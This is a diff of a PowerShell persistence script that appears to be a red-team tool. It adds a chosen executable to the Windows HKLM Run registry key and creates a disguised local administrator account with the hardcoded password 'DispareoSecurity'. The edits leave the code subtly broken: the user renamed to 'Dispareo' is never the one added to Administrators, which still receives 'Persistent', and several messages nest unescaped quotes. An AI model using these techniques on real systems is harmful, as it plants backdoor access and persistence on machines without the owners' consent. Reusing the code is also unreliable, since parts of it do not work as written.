@@ -30,7 +30,7 @@ $CurrentWindowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurren
 $CurrentWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentWindowsIdentity)
 #This should return true if specific user is Admin
 if ($CurrentWindowsPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Ok, cool, you're running as administrator" 
+    Write-Host "Ok, cool, looks like you're running as administrator" 
 } else {
     Write-Warning "[!] This is awkard, but you don't have permission. Run again as an administrator or keep elevating until you can."
     exit 1
@@ -42,17 +42,17 @@ function RegKey {
     param ([Parameter(Mandatory)]$file,
     [switch]$RegKey)
    
-    Write-Host "Trying to write the bring your own executable to the registry Key"
+    Write-Host "Trying to write the "bring your own executable" to the registry Key"
     $regKeyPath = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
     reg add $regKeyPath /v Dispareos_Persistence /t REG_SZ /d "$file"
-    Write-Host "Persistent Reg key added!"
+    Write-Host "[!][!] Persistent Reg key added! Your executable now will run every time the PC reboots"
 }
 
 # Function to handle Admin privileges
 function Addmin {
-    Write-Host "Adding the admin.... (adding admin user). Also, did anyone appreciate the Dad joke using the "addmin" parameter? Just know there are plenty more when "
+    Write-Host "Adding the admin user "Dispareo").`n[*] The user name will be "dispareo" and the password will also be (surprise!~) "DispareoSecurity" .`nok, but did anyone appreciate the Dad joke using the "addmin" parameter? Just know there are plenty more when "
     try {
-        New-LocalUser -Name 'Persistent' -Description 'Definitely a valid admin account' -Password (ConvertTo-SecureString "DispareoSecurity" -AsPlainText -Force)
+        New-LocalUser -Name 'Dispareo' -Description 'Definitely a valid admin account' -Password (ConvertTo-SecureString "DispareoSecurity" -AsPlainText -Force)
         Add-LocalGroupMember -Group "Administrators" -Member "Persistent"
 
     }
